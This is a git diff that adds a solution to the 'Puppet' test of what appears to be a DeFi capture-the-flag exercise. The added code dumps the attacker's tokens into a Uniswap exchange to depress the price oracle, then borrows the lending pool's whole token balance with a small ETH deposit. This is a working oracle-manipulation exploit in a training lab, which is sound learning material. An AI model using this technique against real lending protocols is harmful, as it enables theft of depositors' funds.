@@ -103,6 +103,26 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Swap all DVT fot ETH -> ETH price increase -> Deposit ETH in lending pool -> Borrow all the DVT
+        let price = await this.uniswapExchange.getTokenToEthInputPrice(
+            ethers.utils.parseEther('1'),
+            { gasLimit: 1e6 }
+        )
+        console.log(ethers.utils.formatEther(price))
+        const blockNumBefore = await ethers.provider.getBlockNumber();
+        const blockBefore = await ethers.provider.getBlock(blockNumBefore);
+        const timestampBefore = blockBefore.timestamp;
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther('999'), 1, timestampBefore * 2)
+        price = await this.uniswapExchange.getTokenToEthInputPrice(
+            ethers.utils.parseEther('1'),
+            { gasLimit: 1e6 }
+        )
+        let attacker_balance = await ethers.provider.getBalance(attacker.address)
+        let ether_amount = ethers.utils.parseUnits("34")
+        console.log(ethers.utils.formatEther(attacker_balance))
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ether_amount })
+        console.log(ethers.utils.formatEther(price))
     });
 
     after(async function () {
